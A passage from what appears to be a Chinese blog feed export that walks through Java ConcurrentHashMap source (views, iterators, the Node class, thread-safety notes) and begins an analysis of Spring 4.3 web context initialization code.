class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> K <span class="title function_">nextElement</span><span class="params">()</span> &#123; <span class="keyword">return</span> next(); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="8-2-values"><a href="#8-2-values" class="headerlink" title="8.2 values()"></a>8.2 values()</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Collection&lt;V&gt; <span class="title function_">values</span><span class="params">()</span> &#123;</span><br><span class="line">    ValuesView&lt;K,V&gt; vs;</span><br><span class="line">    <span class="keyword">return</span> (vs = values) != <span class="literal">null</span> ? vs : (values = <span class="keyword">new</span> <span class="title class_">ValuesView</span>&lt;K,V&gt;(<span class="built_in">this</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8-2-1-ValuesView"><a href="#8-2-1-ValuesView" class="headerlink" title="8.2.1 ValuesView"></a>8.2.1 ValuesView</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ValuesView</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">CollectionView</span>&lt;K,V,V&gt;</span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">Collection</span>&lt;V&gt;, java.io.Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">2249069246763182397L</span>;</span><br><span class="line">    ValuesView(ConcurrentHashMap&lt;K,V&gt; map) &#123; <span class="built_in">super</span>(map); &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.containsValue(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">remove</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (o != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Iterator&lt;V&gt; it = iterator(); it.hasNext();) &#123;</span><br><span class="line">                <span class="keyword">if</span> (o.equals(it.next())) &#123;</span><br><span class="line">                    it.remove();</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Iterator&lt;V&gt; <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">        ConcurrentHashMap&lt;K,V&gt; m = map;</span><br><span class="line">        Node&lt;K,V&gt;[] t;</span><br><span class="line">        <span class="type">int</span> <span class="variable">f</span> <span class="operator">=</span> (t = m.table) == <span class="literal">null</span> ? <span class="number">0</span> : t.length;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ValueIterator</span>&lt;K,V&gt;(t, f, <span class="number">0</span>, f, m);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(V e)</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">addAll</span><span class="params">(Collection&lt;? extends V&gt; c)</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Spliterator&lt;V&gt; <span class="title function_">spliterator</span><span class="params">()</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] t;</span><br><span class="line">        ConcurrentHashMap&lt;K,V&gt; m = map;</span><br><span class="line">        <span class="type">long</span> <span class="variable">n</span> <span class="operator">=</span> m.sumCount();</span><br><span class="line">        <span class="type">int</span> <span class="variable">f</span> <span class="operator">=</span> (t = m.table) == <span class="literal">null</span> ? <span class="number">0</span> : t.length;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ValueSpliterator</span>&lt;K,V&gt;(t, f, <span class="number">0</span>, f, n &lt; <span class="number">0L</span> ? <span class="number">0L</span> : n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">forEach</span><span class="params">(Consumer&lt;? <span class="built_in">super</span> V&gt; action)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (action == <span class="literal">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        Node&lt;K,V&gt;[] t;</span><br><span class="line">        <span class="keyword">if</span> ((t = map.table) != <span class="literal">null</span>) &#123;</span><br><span class="line">            Traverser&lt;K,V&gt; it = <span class="keyword">new</span> <span class="title class_">Traverser</span>&lt;K,V&gt;(t, t.length, <span class="number">0</span>, t.length);</span><br><span class="line">            <span class="keyword">for</span> (Node&lt;K,V&gt; p; (p = it.advance()) != <span class="literal">null</span>; )</span><br><span class="line">                action.accept(p.val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8-2-2-ValueIterator"><a href="#8-2-2-ValueIterator" class="headerlink" title="8.2.2 ValueIterator"></a>8.2.2 ValueIterator</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ValueIterator</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">BaseIterator</span>&lt;K,V&gt;</span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">Iterator</span>&lt;V&gt;, Enumeration&lt;V&gt; &#123;</span><br><span class="line">    ValueIterator(Node&lt;K,V&gt;[] tab, <span class="type">int</span> index, <span class="type">int</span> size, <span class="type">int</span> limit,</span><br><span class="line">                  ConcurrentHashMap&lt;K,V&gt; map) &#123;</span><br><span class="line">        <span class="built_in">super</span>(tab, index, size, limit, map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> V <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt; p;</span><br><span class="line">        <span class="keyword">if</span> ((p = next) == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchElementException</span>();</span><br><span class="line">        <span class="type">V</span> <span class="variable">v</span> <span class="operator">=</span> p.val;</span><br><span class="line">        lastReturned = p;</span><br><span class="line">        advance();</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> V <span class="title function_">nextElement</span><span class="params">()</span> &#123; <span class="keyword">return</span> next(); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="8-3-entrySet"><a href="#8-3-entrySet" class="headerlink" title="8.3 entrySet()"></a>8.3 entrySet()</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet() &#123;</span><br><span class="line">    EntrySetView&lt;K,V&gt; es;</span><br><span class="line">    <span class="keyword">return</span> (es = entrySet) != <span class="literal">null</span> ? es : (entrySet = <span class="keyword">new</span> <span class="title class_">EntrySetView</span>&lt;K,V&gt;(<span class="built_in">this</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8-3-1-EntrySetView"><a href="#8-3-1-EntrySetView" class="headerlink" title="8.3.1 EntrySetView"></a>8.3.1 EntrySetView</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">EntrySetView</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">CollectionView</span>&lt;K,V,Map.Entry&lt;K,V&gt;&gt;</span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">Set</span>&lt;Map.Entry&lt;K,V&gt;&gt;, java.io.Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">2249069246763182397L</span>;</span><br><span class="line">    EntrySetView(ConcurrentHashMap&lt;K,V&gt; map) &#123; <span class="built_in">super</span>(map); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        Object k, v, r; Map.Entry&lt;?,?&gt; e;</span><br><span class="line">        <span class="keyword">return</span> ((o <span class="keyword">instanceof</span> Map.Entry) &amp;&amp;</span><br><span class="line">                (k = (e = (Map.Entry&lt;?,?&gt;)o).getKey()) != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                (r = map.get(k)) != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                (v = e.getValue()) != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                (v == r || v.equals(r)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">remove</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        Object k, v; Map.Entry&lt;?,?&gt; e;</span><br><span class="line">        <span class="keyword">return</span> ((o <span class="keyword">instanceof</span> Map.Entry) &amp;&amp;</span><br><span class="line">                (k = (e = (Map.Entry&lt;?,?&gt;)o).getKey()) != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                (v = e.getValue()) != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                map.remove(k, v));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@return</span> an iterator over the entries of the backing map</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    <span class="keyword">public</span> Iterator&lt;Map.Entry&lt;K,V&gt;&gt; iterator() &#123;</span><br><span class="line">        ConcurrentHashMap&lt;K,V&gt; m = map;</span><br><span class="line">        Node&lt;K,V&gt;[] t;</span><br><span class="line">        <span class="type">int</span> <span class="variable">f</span> <span class="operator">=</span> (t = m.table) == <span class="literal">null</span> ? <span class="number">0</span> : t.length;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntryIterator</span>&lt;K,V&gt;(t, f, <span class="number">0</span>, f, m);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(Entry&lt;K,V&gt; e)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.putVal(e.getKey(), e.getValue(), <span class="literal">false</span>) == <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">addAll</span><span class="params">(Collection&lt;? extends Entry&lt;K,V&gt;&gt; c)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">added</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e : c) &#123;</span><br><span class="line">            <span class="keyword">if</span> (add(e))</span><br><span class="line">                added = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> added;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Node&lt;K,V&gt;[] t;</span><br><span class="line">        <span class="keyword">if</span> ((t = map.table) != <span class="literal">null</span>) &#123;</span><br><span class="line">            Traverser&lt;K,V&gt; it = <span class="keyword">new</span> <span class="title class_">Traverser</span>&lt;K,V&gt;(t, t.length, <span class="number">0</span>, t.length);</span><br><span class="line">            <span class="keyword">for</span> (Node&lt;K,V&gt; p; (p = it.advance()) != <span class="literal">null</span>; ) &#123;</span><br><span class="line">                h += p.hashCode();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        Set&lt;?&gt; c;</span><br><span class="line">        <span class="keyword">return</span> ((o <span class="keyword">instanceof</span> Set) &amp;&amp;</span><br><span class="line">                ((c = (Set&lt;?&gt;)o) == <span class="built_in">this</span> ||</span><br><span class="line">                 (containsAll(c) &amp;&amp; c.containsAll(<span class="built_in">this</span>))));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Spliterator&lt;Map.Entry&lt;K,V&gt;&gt; spliterator() &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] t;</span><br><span class="line">        ConcurrentHashMap&lt;K,V&gt; m = map;</span><br><span class="line">        <span class="type">long</span> <span class="variable">n</span> <span class="operator">=</span> m.sumCount();</span><br><span class="line">        <span class="type">int</span> <span class="variable">f</span> <span class="operator">=</span> (t = m.table) == <span class="literal">null</span> ? <span class="number">0</span> : t.length;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntrySpliterator</span>&lt;K,V&gt;(t, f, <span class="number">0</span>, f, n &lt; <span class="number">0L</span> ? <span class="number">0L</span> : n, m);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">forEach</span><span class="params">(Consumer&lt;? <span class="built_in">super</span> Map.Entry&lt;K,V&gt;&gt; action)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (action == <span class="literal">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        Node&lt;K,V&gt;[] t;</span><br><span class="line">        <span class="keyword">if</span> ((t = map.table) != <span class="literal">null</span>) &#123;</span><br><span class="line">            Traverser&lt;K,V&gt; it = <span class="keyword">new</span> <span class="title class_">Traverser</span>&lt;K,V&gt;(t, t.length, <span class="number">0</span>, t.length);</span><br><span class="line">            <span class="keyword">for</span> (Node&lt;K,V&gt; p; (p = it.advance()) != <span class="literal">null</span>; )</span><br><span class="line">                action.accept(<span class="keyword">new</span> <span class="title class_">MapEntry</span>&lt;K,V&gt;(p.key, p.val, map));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8-3-2-EntryIterator"><a href="#8-3-2-EntryIterator" class="headerlink" title="8.3.2 EntryIterator"></a>8.3.2 EntryIterator</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">EntryIterator</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">BaseIterator</span>&lt;K,V&gt;</span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">Iterator</span>&lt;Map.Entry&lt;K,V&gt;&gt; &#123;</span><br><span class="line">    EntryIterator(Node&lt;K,V&gt;[] tab, <span class="type">int</span> index, <span class="type">int</span> size, <span class="type">int</span> limit,</span><br><span class="line">                  ConcurrentHashMap&lt;K,V&gt; map) &#123;</span><br><span class="line">        <span class="built_in">super</span>(tab, index, size, limit, map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Map.Entry&lt;K,V&gt; <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt; p;</span><br><span class="line">        <span class="keyword">if</span> ((p = next) == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchElementException</span>();</span><br><span class="line">        <span class="type">K</span> <span class="variable">k</span> <span class="operator">=</span> p.key;</span><br><span class="line">        <span class="type">V</span> <span class="variable">v</span> <span class="operator">=</span> p.val;</span><br><span class="line">        lastReturned = p;</span><br><span class="line">        advance();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MapEntry</span>&lt;K,V&gt;(k, v, map);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Node类"><a href="#Node类" class="headerlink" title="Node类"></a>Node类</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Node</span>&lt;K,V&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry&lt;K,V&gt; &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> hash;</span><br><span class="line">    <span class="keyword">final</span> K key;</span><br><span class="line">    <span class="keyword">volatile</span> V val;</span><br><span class="line">    <span class="keyword">volatile</span> Node&lt;K,V&gt; next;</span><br><span class="line"></span><br><span class="line">    Node(<span class="type">int</span> hash, K key, V val, Node&lt;K,V&gt; next) &#123;</span><br><span class="line">        <span class="built_in">this</span>.hash = hash;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">        <span class="built_in">this</span>.val = val;</span><br><span class="line">        <span class="built_in">this</span>.next = next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> K <span class="title function_">getKey</span><span class="params">()</span>       &#123; <span class="keyword">return</span> key; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> V <span class="title function_">getValue</span><span class="params">()</span>     &#123; <span class="keyword">return</span> val; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span>   &#123; <span class="keyword">return</span> key.hashCode() ^ val.hashCode(); &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">toString</span><span class="params">()</span>&#123; <span class="keyword">return</span> key + <span class="string">&quot;=&quot;</span> + val; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> V <span class="title function_">setValue</span><span class="params">(V value)</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        Object k, v, u; Map.Entry&lt;?,?&gt; e;</span><br><span class="line">        <span class="keyword">return</span> ((o <span class="keyword">instanceof</span> Map.Entry) &amp;&amp;</span><br><span class="line">                (k = (e = (Map.Entry&lt;?,?&gt;)o).getKey()) != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                (v = e.getValue()) != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                (k == key || k.equals(key)) &amp;&amp;</span><br><span class="line">                (v == (u = val) || v.equals(u)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Virtualized support for map.get(); overridden in subclasses.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    Node&lt;K,V&gt; <span class="title function_">find</span><span class="params">(<span class="type">int</span> h, Object k)</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt; e = <span class="built_in">this</span>;</span><br><span class="line">        <span class="keyword">if</span> (k != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                K ek;</span><br><span class="line">                <span class="keyword">if</span> (e.hash == h &amp;&amp;</span><br><span class="line">                    ((ek = e.key) == k || (ek != <span class="literal">null</span> &amp;&amp; k.equals(ek))))</span><br><span class="line">                    <span class="keyword">return</span> e;</span><br><span class="line">            &#125; <span class="keyword">while</span> ((e = e.next) != <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h1><ul>
<li><p>元素：插入无序，循环输出有序，相同key会覆盖旧值，key、value均不能为null（因为会出现歧义且不合理），不可以直接使用迭代器遍历，可间接遍历。</p>
</li>
<li><p>效率：通过数组 +（单链表或红黑树）实现，key的hash值计算和Node数组下标计算均采用位运算符，因而增、删、改、查效率都较高。</p>
</li>
<li><p>安全性：线程安全，数组指定下标为null时，通过CAS插入，不是null且不是转换节点时，通过synchronized加锁插入。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>源码分析</category>
        <category>集合</category>
        <category>ConcurrentHashMap</category>
      </categories>
      <tags>
        <tag>源码分析</tag>
        <tag>ConcurrentHashMap</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring初始化源码分析</title>
    <url>/2023/11/06/$$Spring%E5%88%9D%E5%A7%8B%E5%8C%96%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="1-说明"><a href="#1-说明" class="headerlink" title="1.说明"></a>1.说明</h1><p>基于spring xml配置文件的web工程，使用maven构建，spring版本：4.3.20.RELEASE，本文从上往下逐段分析。</p>
<p>spring应用上下文：org.springframework.web.context.support.XmlWebApplicationContext</p>
<p>spring容器：org.springframework.beans.factory.support.DefaultListableBeanFactory</p>
<h1 id="2-入口代码分析"><a href="#2-入口代码分析" class="headerlink" title="2.入口代码分析"></a>2.入口代码分析</h1><h2 id="2-1-ContextLoaderListener类"><a href="#2-1-ContextLoaderListener类" class="headerlink" title="2.1 ContextLoaderListener类"></a>2.1 ContextLoaderListener类</h2><p>继承ContextLoader类，并实现了ServletContextListener接口，因此，在servlet容器初始化后，会触发监听器的contextInitialized(ServletContextEvent event)方法，此处为spring初始化入口。</p>
<h2 id="2-2-contextInitialized方法"><a href="#2-2-contextInitialized方法" class="headerlink" title="2.2 contextInitialized方法"></a>2.2 contextInitialized方法</h2><p>org.springframework.web.context.ContextLoaderListener#contextInitialized</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextInitialized</span><span class="params">(ServletContextEvent event)</span> &#123;</span><br><span class="line">   initWebApplicationContext(event.getServletContext());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-3-initWebApplicationContext方法"><a href="#2-3-initWebApplicationContext方法" class="headerlink" title="2.3 initWebApplicationContext方法"></a>2.3 initWebApplicationContext方法</h2><p>org.springframework.web.context.ContextLoader#initWebApplicationContext</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> WebApplicationContext <span class="title function_">initWebApplicationContext</span><span class="params">(ServletContext servletContext)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (servletContext.getAttribute(WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(</span><br><span class="line">            <span class="string">&quot;Cannot initialize context because there is already a root application context present - &quot;</span> +</span><br><span class="line">            <span class="string">&quot;check whether you have multiple ContextLoader* definitions in your web.xml!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Log</span> <span class="variable">logger</span> <span class="operator">=</span> LogFactory.getLog(ContextLoader.class);</span><br><span class="line">    servletContext.log(<span class="string">&quot;Initializing Spring root WebApplicationContext&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (logger.isInfoEnabled()) &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;Root WebApplicationContext: initialization started&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// Store context in local instance variable, to guarantee that</span></span><br><span class="line">        <span class="comment">// it is available on ServletContext shutdown.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.context == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 创建spring应用上下文，详细：分析1</span></span><br><span class="line">            <span class="built_in">this</span>.context = createWebApplicationContext(servletContext);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.context <span class="keyword">instanceof</span> ConfigurableWebApplicationContext) &#123;</span><br><span class="line">            <span class="type">ConfigurableWebApplicationContext</span> <span class="variable">cwac</span> <span class="operator">=</span> (ConfigurableWebApplicationContext) <span class="built_in">this</span>.context;</span><br><span class="line">            <span class="keyword">if</span> (!cwac.isActive()) &#123;</span><br><span class="line">                <span class="comment">// The context has not yet been refreshed -&gt; provide services such as</span></span><br><span class="line">                <span class="comment">// setting the parent context, setting the application context id, etc</span></span><br><span class="line">                <span class="keyword">if</span> (cwac.getParent() == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// The context instance was injected without an explicit parent -&gt;</span></span><br><span class="line">                    <span class="comment">// determine parent for root web application context, if any.</span></span><br><span class="line">                    <span class="type">ApplicationContext</span> <span class="variable">parent</span> <span class="operator">=</span> loadParentContext(servletContext);</span><br><span class="line">                    cwac.setParent(parent);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 配置和刷新spring应用上下文，详细：2.4</span></span><br><span class="line">                configureAndRefreshWebApplicationContext(cwac, servletContext);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        servletContext.setAttribute(WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE, <span class="built_in">this</span>.context);</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">ccl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span> (ccl == ContextLoader.class.getClassLoader()) &#123;</span><br><span class="line">            currentContext = <span class="built_in">this</span>.context;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (ccl != <span class="literal">null</span>) &#123;</span><br><span class="line">            currentContextPerThread.put(ccl, <span class="built_in">this</span>.context);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">            logger.debug(<span class="string">&quot;Published root WebApplicationContext as ServletContext attribute with name [&quot;</span> +</span><br><span class="line">                         WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (logger.isInfoEnabled()) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">elapsedTime</span> <span class="operator">=</span> System.currentTimeMillis() - startTime;</span><br><span class="line">            logger.info(<span class="string">&quot;Root WebApplicationContext: initialization completed in &quot;</span> + elapsedTime + <span class="string">&quot; ms&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.context;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (RuntimeException ex) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;Context initialization failed&quot;</span>, ex);</span><br><span class="line">        servletContext.setAttribute(WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE, ex);</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Error err) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;Context initialization failed&quot;</span>, err);</span><br><span class="line">        servletContext.setAttribute(WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE, err);</span><br><span class="line">        <span class="keyword">throw</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-4-configureAndRefreshWebApplicationContext方法"><a href="#2-4-configureAndRefreshWebApplicationContext方法" class="headerlink" title="2.4 configureAndRefreshWebApplicationContext方法"></a>2.4 configureAndRefreshWebApplicationContext方法</h2><p>org.springframework.web.context.ContextLoader#configureAndRefreshWebApplicationContext</p>
